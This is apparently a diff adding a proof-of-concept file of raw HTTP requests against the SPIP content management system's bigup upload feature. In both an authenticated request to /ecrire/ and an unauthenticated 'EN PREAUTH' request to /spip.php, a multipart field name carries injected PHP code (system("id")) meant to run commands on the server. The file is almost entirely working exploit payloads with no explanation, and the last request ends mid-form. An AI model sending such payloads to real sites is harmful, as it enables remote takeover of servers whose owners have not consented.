@@ -1,0 +1,109 @@
+POST /ecrire/?exec=document_edit HTTP/1.1
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
+Accept: */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------220087038315691589924077513546
+Content-Length: 1560
+Origin: http://localhost:8000
+Connection: keep-alive
+Referer: http://localhost:8000/ecrire/?exec=document_edit&id_document=1&picker=1
+Cookie: spip_admin=%40aaa%40lol.de; __stripe_mid=5c9a6093-9b5a-4359-8e95-c0f0416d4405b81e9f; wp-settings-time-1=1724779042; spip_session=1_7ba904d6799c54d1922fffeb4e428daa; spip_accepte_ajax=1
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="a['. system(\"id\") . '][]"; filename="a"
+Content-Type: text/plain
+
+Contenu du deuxième fichier
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="exec"
+
+document_edit
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="formulaire_action"
+
+illustrer_document
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="formulaire_action_args"
+
+nOSkZLq2uy02wQeD3aQ/SL4PxQwIsSryUD4OXAGtlakEzXgrtT60rop4NW1rdalMqWmHmlHuO5hBQTCrds1ZE+Y4qY5aUyr3wKDeCMNm9wc=
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="formulaire_action_sign"
+
+d769b8bfcb61b98afeae8340a4b1340db01e2ea94f67f714411aabdc5e5ac555
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="id_document"
+
+1
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="bigup_retrouver_fichiers"
+
+1
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="methode_focus"
+
+upload
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="fichier_upload[]"
+
+
+-----------------------------220087038315691589924077513546
+Content-Disposition: form-data; name="url"
+
+
+-----------------------------220087038315691589924077513546--
+
+
+
+
+
+
+EN PREAUTH:
+
+
+
+
+
+POST /spip.php HTTP/1.1
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
+Accept: */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------27557867612533913872933463044
+Content-Length: 722
+Origin: http://localhost:8000
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://localhost:8000/spip.php?article1
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+
+-----------------------------27557867612533913872933463044
+Content-Disposition: form-data; name="formulaire_action"
+
+forum
+-----------------------------27557867612533913872933463044
+Content-Disposition: form-data; name="bigup_retrouver_fichiers"
+
+1
+-----------------------------27557867612533913872933463044
+Content-Disposition: form-data; name="a['. system(\"id\") . '][]"; filename="a"
+Content-Type: text/plain
+
+Contenu du fichier!
+-----------------------------27557867612533913872933463044
+Content-Disposition: form-data; name="formulaire_action_args"
+
+sM/SRrCLa37g8rWHFPYfN8ICw2sgiYw3uyxS4jnTS3F9Z9h6lrpDZGulrRB12AM015WO4tg6/rl1cXl6sXpVCtkT45nRCZAqCZcvUIJJMqrav4k1R0kOG/64qgvm2S08c2rDTgYwm04PBbr7sQ
+
